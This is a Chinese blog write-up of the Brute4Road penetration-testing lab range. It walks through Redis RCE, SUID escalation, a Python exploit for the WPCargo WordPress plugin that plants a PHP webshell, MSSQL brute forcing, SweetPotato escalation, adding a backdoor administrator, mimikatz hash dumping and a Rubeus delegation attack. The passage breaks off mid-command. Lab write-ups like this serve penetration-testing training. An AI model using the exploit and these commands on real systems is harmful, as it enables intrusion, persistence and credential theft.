---
title: 春秋云镜-【仿真场景】Brute4Road writeup - 渗透测试中心
url: https://www.cnblogs.com/backlion/p/17187345.html
source: 博客园 - 渗透测试中心
date: 2023-03-08
fetch_date: 2025-10-04T08:55:17.288396
---

# 春秋云镜-【仿真场景】Brute4Road writeup - 渗透测试中心

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250929100304557-587378723.jpg)](https://qoder.com/)

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/backlion/)

# [渗透测试中心](https://www.cnblogs.com/backlion)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/backlion/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83)
* [管理](https://i.cnblogs.com/)
* 订阅
  [![订阅](/skins/coffee/images/xml.gif)](https://www.cnblogs.com/backlion/rss/)

# [春秋云镜-【仿真场景】Brute4Road writeup](https://www.cnblogs.com/backlion/p/17187345.html "发布于 2023-03-07 11:04")

## 说明

Brute4Road是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。

## 技术

Redis、Brute Force、SMB、Privilege Elevation、域渗透

## 第一个flag

### redis主从复制RCE

fscan扫描入口ip，如果下面入口ip有变化是因为重启的环境，流程没有问题

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110358384-1535054715.png)

发现了redis的未授权，测试了写计划任务反弹shell，提示没有权限，尝试redis主从复制RCE成功

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110359449-350645622.png)

### suid提权

用户为redis，需要提权，使用suid提权，可以执行以下命令，具体可以查看 Linux系统suid提权1

```
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} ;
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110400345-2096403480.png)

base64是具有suid权限的，我们可以通过base64读取本地文件并输出，获取到第一个flag

```
base64 "/home/redis/flag/flag01" | base64 --decode
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110401155-925199797.png)

## 第二个flag

### wpcargo未授权RCE

在入口ip的服务器上设置代理，并进行内网扫描，通过weget上传 npc和fscan

```
start ping
(icmp) Target 172.22.2.18     is alive
(icmp) Target 172.22.2.34     is alive
(icmp) Target 172.22.2.3      is alive
(icmp) Target 172.22.2.7      is alive
(icmp) Target 172.22.2.16     is alive
[*] Icmp alive hosts len is: 5
172.22.2.16:445 open
172.22.2.34:445 open
172.22.2.3:445 open
172.22.2.18:445 open
172.22.2.16:139 open
172.22.2.34:139 open
172.22.2.3:139 open
172.22.2.34:135 open
172.22.2.16:135 open
172.22.2.18:139 open
172.22.2.3:135 open
172.22.2.16:80 open
172.22.2.3:88 open
172.22.2.18:22 open
172.22.2.7:80 open
172.22.2.7:22 open
172.22.2.7:6379 open
172.22.2.16:1433 open
172.22.2.7:21 open
172.22.2.18:80 open
[*] alive ports len is: 20
start vulscan
[+] NetInfo:
[*]172.22.2.16
   [->]MSSQLSERVER
   [->]172.22.2.16
[*] 172.22.2.34          XIAORANG\CLIENT01
[*] 172.22.2.16  (Windows Server 2016 Datacenter 14393)
[+] NetInfo:
[*]172.22.2.3
   [->]DC
   [->]172.22.2.3
[*] WebTitle:http://172.22.2.16        code:404 len:315    title:Not Found
[+] NetInfo:
[*]172.22.2.34
   [->]CLIENT01
   [->]172.22.2.34
[*] WebTitle:http://172.22.2.7         code:200 len:4833   title:Welcome to CentOS
[*] 172.22.2.16          XIAORANG\MSSQLSERVER       Windows Server 2016 Datacenter 14393
[*] 172.22.2.3     [+]DC XIAORANG\DC                Windows Server 2016 Datacenter 14393
[*] 172.22.2.18          WORKGROUP\UBUNTU-WEB02
[*] 172.22.2.3  (Windows Server 2016 Datacenter 14393)
[+] ftp://172.22.2.7:21:anonymous
   [->]pub
[*] WebTitle:http://172.22.2.18        code:200 len:57738  title:又一个WordPress站点
```

使用 wpscan扫描下wordpress站点

```
proxychains wpscan --url http://172.22.2.18
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110402168-1038472832.png)

可以看到存在wpcargo插件，搜索相关漏洞，有个未授权RCE漏洞

[https://wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a](https://link.zhihu.com/?target=https%3A//wpscan.com/vulnerability/5c21ad35-b2fb-4a51-858f-8ffff685de4a)

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110402965-813650361.png)

```
import sys
import binascii
import requests

# This is a magic string that when treated as pixels and compressed using the png
# algorithm, will cause <?=$_GET[1]($_POST[2]);?> to be written to the png file
payload = '2f49cf97546f2c24152b216712546f112e29152b1967226b6f5f50'

def encode_character_code(c: int):
    return '{:08b}'.format(c).replace('0', 'x')

text = ''.join([encode_character_code(c) for c in binascii.unhexlify(payload)])[1:]

destination_url = 'http://172.22.2.18/'
cmd = 'ls'

# With 1/11 scale, '1's will be encoded as single white pixels, 'x's as single black pixels.
requests.get(
    f"{destination_url}wp-content/plugins/wpcargo/includes/barcode.php?text={text}&sizefactor=.090909090909&size=1&filepath=/var/www/html/webshell.php"
)

# We have uploaded a webshell - now let's use it to execute a command.
print(requests.post(
    f"{destination_url}webshell.php?1=system", data={"2": cmd}
).content.decode('ascii', 'ignore'))
```

生成shell

```
http://172.22.2.18/webshell.php?1=system
POST:2=whoami
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110403759-1226503060.png)

连接蚁剑，注意类型要选择 cmdLinux （这个浪费了很多时间，对工具不熟悉）

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110404544-1755873580.png)

查看数据库的配置，并连接

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110405448-1709834423.png)

找到第二个flag

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110406190-537113638.png)

## 第三个flag

发现了一张存放密码的表

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110407012-1016357418.png)

### MSSqlServer RCE

用刚才数据库里拿到的密码表爆破MsSQL，得到密码为ElGNkOiC

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110407761-264141218.png)

使用Multiple.Database.Utilization.Tools工具连接

先激活Ole Automation Procedures组件，再上传SweetPotato.exe提权，得到system权限

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110408557-1385769716.png)

```
C:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a "netstat -ano"
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110409338-1429948219.png)

发现3389开放着，直接添加用户，远程连接

```
net user devyn Admin123 /add
net localgroup administrators devyn /add
```

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110410189-1297694899.png)

远程连接成功

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110411000-98762776.png)

获得第三个flag

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110411923-340307306.png)

## ‍第四个flag

### 域渗透

使用mimikatz，抓取域用户的hash

![](https://img2023.cnblogs.com/blog/1049983/202303/1049983-20230307110412739-899773243.png)

获取到域用户的哈希为78a2811aabd779d0da3cef84903ca3e6

### 约束委派攻击

MSSQLSERVER机器配置了到 DC LDAP 和 CIFS 服务的约束性委派

首先通过Rubeus申请机器账户MSSQLSERVER的TGT，执行后，将得到 Base64 加密后的 TGT 票据

```
Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:78a2811aabd779d0da3cef84903ca3e6 /domain:x...